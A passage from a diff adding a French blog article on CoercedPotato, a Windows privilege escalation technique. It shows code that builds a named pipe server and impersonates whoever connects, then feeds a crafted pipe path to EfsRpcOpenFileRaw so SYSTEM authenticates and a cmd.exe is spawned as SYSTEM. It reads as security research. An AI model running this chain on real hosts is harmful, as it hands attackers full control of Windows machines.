+connexion entrante. Cela permet de mettre en pause le thread.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;ConnectNamedPipe&lt;/strong&gt;(hPipe, NULL)&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;ImpersonateNamedPipeClient()&lt;/strong&gt; – Une fois une connexion obtenue,
+nous nous placons dans le contexte de sécurité du client pour le reste du
+code exécuté. La connexion est contenue dans la variable &lt;strong&gt;hPipe&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;ImpersonateNamedPipeClient&lt;/strong&gt;(hPipe)&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;OpenThreadToken()&lt;/strong&gt; – Lancement d’un nouveau thread dans le contexte
+de sécurité du client. Cela n’est possible que si la connexion au
+serveur pipe a été effectuée avec un &lt;strong&gt;impersonation token&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;OpenThreadToken&lt;/strong&gt;(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE,
+&amp;amp;hToken)&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;CreateProcessWithTokenW()&lt;/strong&gt; – Dans ce thread, nous venons démarrer un
+nouveau processus (par exemple &lt;strong&gt;cmd.exe&lt;/strong&gt;) à l’aide de
+l’&lt;strong&gt;impersonation token&lt;/strong&gt;. Cela n’est possible qu’avec un
+&lt;strong&gt;impersonation token&lt;/strong&gt; de niveau 3 ou 4.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;CreateProcessWithTokenW&lt;/strong&gt;(hToken, LOGON_NETCREDENTIALS_ONLY, NULL,
+newCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, &amp;amp;si,
+&amp;amp;pi)&lt;/p&gt;
+
+&lt;p&gt;Et voilà ! Nous sommes maintenant capables d’exécuter du code en tant
+qu’un autre utilisateur dès lors qu’il se connecte sur notre serveur
+pipe.&lt;/p&gt;
+
+&lt;p&gt;Toutes ces fonctions sont documentées sur le site de Microsoft
+&lt;a href=&quot;https://learn.microsoft.com/&quot;&gt;https://learn.microsoft.com/&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Maintenant que tout est en place, il ne reste plus qu’à forcer le compte
+&lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt; à s’authentifier !&lt;/p&gt;
+
+&lt;h2 id=&quot;création-du-lien-rpc&quot;&gt;Création du lien RPC&lt;/h2&gt;
+
+&lt;p&gt;Selon la fonction RPC vulnérable que nous allons appeler, il peut être
+nécessaire de créer une liaison avec l’interface RPC que nous voulons
+utiliser : nous devons créer un &lt;strong&gt;RPC binding&lt;/strong&gt; &lt;strong&gt;handle&lt;/strong&gt;. Une
+interface RPC pourrait s’apparenter à une classe en programmation
+orientée objet. Elle implémente donc un certain nombre de
+méthodes/fonctions. Nous commençons par définir la manière dont la
+connexion RPC doit être établie en appelant la fonction
+&lt;strong&gt;RpcStringBindingCompose()&lt;/strong&gt; :&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;RpcStringBindingCompose&lt;/strong&gt;(nullptr, (RPC_WSTR)L”ncalrpc”, nullptr,
+nullptr, nullptr, &amp;amp;bindingString);&lt;/p&gt;
+
+&lt;p&gt;Cela va permettre de créer une description de la liaison RPC qui va être
+établie pour spécifier un certain nombre de paramètres. Nous spécifions
+d’ailleurs le paramètre &lt;strong&gt;sequence protocol&lt;/strong&gt;, ici &lt;strong&gt;ncalrpc&lt;/strong&gt;, qui est
+un protocole permettant les connexions interprocessus. Le pointeur NULL
+sur les autres paramètres permet une liaison dynamique des interfaces
+RPC auxquelles se connecter et d’effectuer les connexions en local.&lt;/p&gt;
+
+&lt;p&gt;Nous lançons ensuite la fonction &lt;strong&gt;RpcBindingFromStringBinding&lt;/strong&gt; pour
+effectuer la connexion RPC sur le serveur cible (localhost dans notre
+cas) et récupérer cette liaison dans la variable &lt;strong&gt;Binding&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;RpcBindingFromStringBinding&lt;/strong&gt;(bindingString, &amp;amp;binding_h)&lt;/p&gt;
+
+&lt;p&gt;Et voilà ! Nous avons maintenant établi une connexion RPC en local.
+Cette liaison RPC peut être maintenant utilisée pour appeler des
+fonctions RPC implémentées sur différentes interfaces.&lt;/p&gt;
+
+&lt;h2 id=&quot;maintenant-que-tout-est-en-place-plus-quà-appeler-une-fonction-rpc-vulnérable&quot;&gt;Maintenant que tout est en place, plus qu’à appeler une fonction RPC vulnérable&lt;/h2&gt;
+
+&lt;p&gt;La fin de la partie technique est proche, tenez bon ! 😊&lt;/p&gt;
+
+&lt;p&gt;Pour faire appel à une fonction RPC en C++, nous devons premièrement
+disposer d’un client compilé de l’interface ciblée : pour l’exemple,
+nous prendrons &lt;strong&gt;MS-EFSR&lt;/strong&gt;. Pour faire simple, pour appeler les
+fonctions qui nous intéressent, il faut le code qui implémente les
+fonctions RPC, notre client RPC.&lt;/p&gt;
+
+&lt;p&gt;C’est là que ça se complique… L’objectif est donc de récupérer un
+fichier IDL (Interface Definition File) décrivant les fonctions de
+l’interface RPC. Ce fichier permet de compiler le code pour le client et
+le serveur. L’auteur @itm4n a (heureusement) écrit un article permettant
+grandement d’aider les personnes se lançant dans cette quête :
+&lt;a href=&quot;https://itm4n.github.io/from-rpcview-to-petitpotam/&quot;&gt;https://itm4n.github.io/from-rpcview-to-petitpotam/&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Finalement, après avoir tenté plusieurs techniques compliquées et non
+concluantes, il s’est avéré qu’une méthode reste la plus fiable : RTFM !&lt;/p&gt;
+
+&lt;p&gt;Pour chaque interface RPC, Microsoft a publié le fichier IDL dans la
+documentation officielle.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/4a25b8e1-fd90-41b6-9301-62ed71334436&quot;&gt;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/4a25b8e1-fd90-41b6-9301-62ed71334436&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image9.png&quot; style=&quot;width:6.3in;height:4.57222in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture d’écran, Police Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Il suffit donc de copier-coller le contenu de l’IDL dans un fichier .idl
+d’un projet Visual Studio et de le compiler. A force de nous battre avec
+les problèmes de typages,nous avons fini par trouver une solution plutôt simple.
+Voici notre recette :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image10.jpeg&quot; style=&quot;width:0.18056in;height:0.19861in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant Visage humain, personne, habits, Humain Description générée automatiquement&quot; /&gt;Une
+fois le contenu du fichier IDL récupéré et collé dans un fichier,
+retirer la ligne &lt;strong&gt;import “ms-dtyp.idl”;&lt;/strong&gt;. Garder cette ligne
+génère un grand nombre de problèmes de typage qui sont fastidieux à
+débugger.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Compiler l’IDL pour détecter de potentiels problèmes de définition
+de types.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image11.png&quot; style=&quot;width:4.59259in;height:1.03526in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture d’écran, Police, logiciel Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;En fonction de ce qui est remonté, ajouter la définition en début de
+fichiers. La définition de ces types se retrouve ici :&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/24637f2d-238b-4d22-b44d-fe54b024280c&quot;&gt;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/24637f2d-238b-4d22-b44d-fe54b024280c&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image12.png&quot; style=&quot;width:3.42587in;height:1.67593in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture d’écran, Police, algèbre Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Continuer ces deux dernières étapes jusqu’à ce que la compilation
+fonctionne sans erreur.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Une fois compilé, le fichier IDL permet d’obtenir trois fichiers :
+&lt;strong&gt;ms-efsr_c.c&lt;/strong&gt; (le client RPC), &lt;strong&gt;ms-efsr_s.c&lt;/strong&gt; (le serveur RPC) et
+&lt;strong&gt;ms-efsr_h.h&lt;/strong&gt; (fichier d’entêtes). Ceux qui nous intéressent dans le
+cadre de l’exploit sont le fichier client RPC et le fichier d’entêtes.
+Ces fichiers implémentent donc toutes les fonctions RPC de l’interface
+&lt;strong&gt;MS-EFSR&lt;/strong&gt; :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image13.png&quot; style=&quot;width:3.84466in;height:1.44062in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture d’écran, Police, affichage Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Il ne nous reste plus qu’à l’appeler ! Personnellement, le C et le C++,
+ce n’est pas ma tasse de thé. Ça tombe bien, bien utilisé, ChatGPT est plutôt
+doué pour ça ! 😊&lt;/p&gt;
+
+&lt;p&gt;Nous allons donc lui demander de nous fournir le code permettant d’initialiser
+correctement chaque paramètre pour chaque fonction.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image14.png&quot; style=&quot;width:5.76096in;height:3.65648in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, Appareils électroniques, capture d’écran, logiciel Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Et voilà ! Toutes les fonctions sont implémentées ! Il ne reste plus
+qu’à les appeler pour forcer l’utilisateur &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt; à
+s’authentifier sur notre named pipe en écoute.&lt;/p&gt;
+
+&lt;p&gt;C’est à ce moment-là que le bug lié aux « / » va faire en sorte qu’un
+processus démarré par &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt; (dans notre cas,
+&lt;strong&gt;lsass.exe&lt;/strong&gt;) se connecte sur un &lt;strong&gt;named pipe&lt;/strong&gt; arbitraire. Par
+exemple, dans le cas de la fonction &lt;strong&gt;EfsRpcOpenFileRaw&lt;/strong&gt;, nous plaçons 
+notre payload dans le paramètre &lt;strong&gt;FileName&lt;/strong&gt;, qui correspond au
+fichier chiffré que le serveur doit ouvrir pour réaliser ou restaurer
+une sauvegarde. En l’occurrence, nous lui indiquons le fichier
+&lt;strong&gt;\127.0.0.1/pipe/coerced\C$\x00&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Par exemple, pour la fonction &lt;strong&gt;EfsRpcOpenFileRaw()&lt;/strong&gt;, nous définissons
+le payload de la sorte :&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;n&quot;&gt;LPWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetedPipeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;targetedPipeName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPWSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LocalAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_PATH&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WCHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;StringCchPrintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;targetedPipeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;L&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;127.0.0.1/pipe/coerced&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;C$&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EfsRpcOpenFileRaw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Binding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetedPipeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Comme expliqué précédemment, à cause une mauvaise interprétation du
+système Windows, une requête est effectuée sur le fichier
+&lt;a href=&quot;file:///\\127.0.0.1\pipe\coerced\pipe\srvsvc&quot;&gt;\127.0.0.1\pipe\coerced\pipe\srvsvc&lt;/a&gt;
+par le compte &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image15.png&quot; style=&quot;width:5.87746in;height:0.48827in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant capture d’écran, texte, logiciel, Logiciel multimédia Description générée automatiquement&quot; /&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image15.png&quot; style=&quot;width:5.896in;height:0.69375in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant capture d’écran, texte, logiciel, Logiciel multimédia Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Grâce à notre serveur pipe, nous récupérons l’authentification et nous lançons 
+un nouveau processus “cmd.exe” !&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image16.png&quot; style=&quot;width:6.3in;height:1.77292in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture d’écran, Police, logiciel Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;That is all folks 😊. Et en prime, un petit schéma récapitulatif de
+l’attaque !&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image17.png&quot; style=&quot;width:5.94589in;height:4.68903in;display:block; margin-left:auto; margin-right:auto&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;finalement-coercedpotato&quot;&gt;Finalement, CoercedPotato !&lt;/h2&gt;
+
+&lt;p&gt;Nous avons finalement abouti à la création d’un outil élargissant ce
+comportement sur l’ensemble (ou presque) des fonctions RPC connues pour
+être vulnérables.&lt;/p&gt;
+
+&lt;p&gt;Ainsi, il est possible de choisir de manière précise quelle fonction RPC
+utiliser, ou de toutes les forcer afin d’en trouver une valide.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image18.png&quot; style=&quot;width:6.3in;height:3.64444in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture d’écran, Police, conception Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A date de l’article, seules les interfaces suivantes sont exploitables :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Des fonctions implémentées sur l’interface &lt;strong&gt;MS-RPRN&lt;/strong&gt; ;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Des fonctions implémentées sur l’interface &lt;strong&gt;MS-EFSR&lt;/strong&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;La finalité de &lt;strong&gt;CoercedPotato&lt;/strong&gt; est de parcourir l’ensemble de ces
+méthodes de coercition jusqu’à en trouver une qui fonctionne.&lt;/p&gt;
+
+&lt;h2 id=&quot;avancement-de-notre-recherche-petite-désillusion&quot;&gt;Avancement de notre recherche : petite désillusion&lt;/h2&gt;
+
+&lt;p&gt;Comme indiqué précédemment, P0dalirus a rassemblé un ensemble de
+fonctions RPC vulnérables pour forcer une authentification d’un compte
+machine sur le réseau, le tout dans l’outil Coercer
+(&lt;a href=&quot;https://github.com/p0dalirius/Coercer&quot;&gt;https://github.com/p0dalirius/Coercer&lt;/a&gt;). Ce projet est notamment
+accompagné d’un autre projet qui référence toutes les fonctions RPC
+potentiellement vulnérables, mais qui n’ont pas encore été testées,
+soient plus de 240 fonctions…
+(&lt;a href=&quot;https://github.com/p0dalirius/windows-coerced-authentication-methods&quot;&gt;https://github.com/p0dalirius/windows-coerced-authentication-methods&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;D’instinct, nous sommes partis du principe que toutes ces méthodes
+seraient exploitables dans le cadre d’une escalade de privilèges en
+local. Mais… c’est plus compliqué que ça !&lt;/p&gt;
+
+&lt;p&gt;Les fonctions RPC vulnérables qui sont aujourd’hui identifiées ont
+toutes un point commun : elles prennent en entrée le chemin d’un fichier
+qui est censé être requêté par un processus lancé par le compte
+&lt;strong&gt;SYSTEM&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Dans le cadre de &lt;strong&gt;MS-RPRN&lt;/strong&gt;, c’est le processus &lt;strong&gt;spoolsv.exe&lt;/strong&gt; qui
+effectue une requête sur le named pipe. Pour &lt;strong&gt;MS-EFSR&lt;/strong&gt;, c’est
+&lt;strong&gt;lsass.exe&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Maintenant, prenons d’autres interfaces qui n’ont pas encore été testées,
+par exemple &lt;strong&gt;MS-EVEN&lt;/strong&gt;. Cette interface RPC est implémentée par le
+processus &lt;strong&gt;svchost.exe&lt;/strong&gt; dans le contexte de sécurité de l’utilisateur
+&lt;strong&gt;NT AUTHORITY\LOCAL SERVICE&lt;/strong&gt;, soit un compte local disposant du niveau
+de privilèges limités.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image19.png&quot; style=&quot;width:4.21781in;height:2.01062in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture d’écran, affichage, nombre Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Par conséquent, forcer ce processus à effectuer une authentification sur
+un named pipe que nous contrôlons n’a pas forcément de sens dans notre
+quête d’élévation de privilèges, puisque nous récupérons une connexion du
+compte &lt;strong&gt;NT AUTHORITY\LOCAL SERVICE&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image20.png&quot; style=&quot;width:6.3in;height:2.06736in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, logiciel, Police, Page web Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Toutes les fonctions RPC des interfaces RPC implémentées par des
+processus lancés dans le contexte de sécurité d’utilisateurs à faibles
+privilèges ne sont donc pas intéressantes dans notre cas.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Prenons ensuite le cas de &lt;strong&gt;MS-SRVS&lt;/strong&gt;. Cette interface RPC est bien
+implémentée par un processus lancé en tant que &lt;strong&gt;SYSTEM&lt;/strong&gt;. Mais ce n’est
+forcément pas suffisant !&lt;/p&gt;
+
+&lt;p&gt;Prenons l’une de ses fonctions RPC telles que définies dans la
+documentation Microsoft : &lt;strong&gt;NetrFileGetInfo()&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image21.png&quot; style=&quot;width:6.3in;height:2.21319in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, Police, capture d’écran, blanc Description générée automatiquement&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Elle prend en paramètre 4 variables : &lt;strong&gt;ServerName&lt;/strong&gt;, soit l’adresse
+serveur qui peut être un named pipe, &lt;strong&gt;FileId&lt;/strong&gt;, soit l’ID d’un fichier
+(inconnu dans notre cas), &lt;strong&gt;Level&lt;/strong&gt;, soit le niveau d’information que
+nous voulons récupérer et &lt;strong&gt;InfoStruct&lt;/strong&gt;, soit la variable qui recueille
+les informations du fichier. Nous écrivons ainsi le code suivant
+permettant d’appeler cette fonction :&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;callNetrFileGetInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wchar&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_t&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetedNamedPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HRESULT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LPFILE&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_INFO&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InfoStruct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fileId&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RpcTryExcept&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NetrFileGetInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;targetedNamedPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fileId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;InfoStruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RpcExcept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXCEPTION&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_EXECUTE&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_HANDLER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
+&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RpcExceptionCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;  
